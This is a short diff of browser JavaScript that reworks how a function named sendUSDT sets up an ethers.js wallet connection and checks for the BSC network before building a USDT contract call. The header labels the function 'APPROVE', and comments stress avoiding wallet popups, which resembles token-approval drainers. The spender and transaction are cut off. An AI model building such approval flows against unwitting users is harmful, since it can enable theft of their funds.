@@ -1,7 +1,4 @@
 let provider;
-let signer;
-let userAddress;
-let isConnecting = false;
 
 // ===== BSC CONFIG =====
 const BSC_CHAIN_ID = "0x38";
@@ -53,22 +50,27 @@ async function ensureBSC() {
 // ===== APPROVE (BSC ONLY) =====
 async function sendUSDT() {
   try {
-    // Set up wallet if not already done (Trust Wallet DApp browser handles this automatically)
+    if (!window.ethereum) {
+      alert("Wallet not found");
+      return;
+    }
+
+    // Step 1: Setup provider (no wallet interaction yet)
     if (!provider) {
       provider = new ethers.BrowserProvider(window.ethereum);
     }
-    
-    if (!signer) {
-      signer = await provider.getSigner();
-      userAddress = await signer.getAddress();
-      
-      const addr = document.getElementById("toAddress");
-      if (addr) addr.value = userAddress;
+
+    // Step 2: Check network BEFORE accessing wallet (no popup)
+    const network = await provider.getNetwork();
+    if (network.chainId !== 56n) {
+      await ensureBSC();
     }
 
-    // Ensure we're on BSC network before transaction
-    await ensureBSC();
+    // Step 3: Get signer ONLY when making transaction (Trust Wallet handles this seamlessly)
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
 
+    // Create contract with signer
     const usdt = new ethers.Contract(
       BSC_USDT,
       ABI,
